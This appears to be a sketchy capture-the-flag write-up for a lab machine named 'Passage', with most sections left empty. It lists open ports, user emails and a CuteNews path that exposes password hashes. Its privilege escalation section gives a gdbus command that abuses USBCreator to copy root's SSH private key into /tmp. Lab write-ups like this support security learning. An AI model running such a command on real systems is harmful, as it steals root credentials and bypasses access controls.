Name & IP Address of Machine:
> # PASSAGE : `10.10.10.206`
**Table Of Contents:**
<!-- TOC -->

- [Synopsis](#synopsis)
    - [Opened Ports:](#opened-ports)
- [Enumeration](#enumeration)
- [- `http://10.10.10.206/CuteNews/cdata/users/lines` Bunch of hashes exposed](#--http101010206cutenewscdatauserslines-bunch-of-hashes-exposed)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

## Synopsis

---

#### Opened Ports: 
- [ ] 22(SSH)
- [ ] 80 (HTTP)

---

## Enumeration
- `nadav@passage.htb` , `paul@passage.htb`
- `http://10.10.10.206/CuteNews/cdata/users/lines` Bunch of hashes exposed
---

## FootHold

---

## Lateral Movement

---

## Privilege Escalation
USing usBCretor
```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
```
---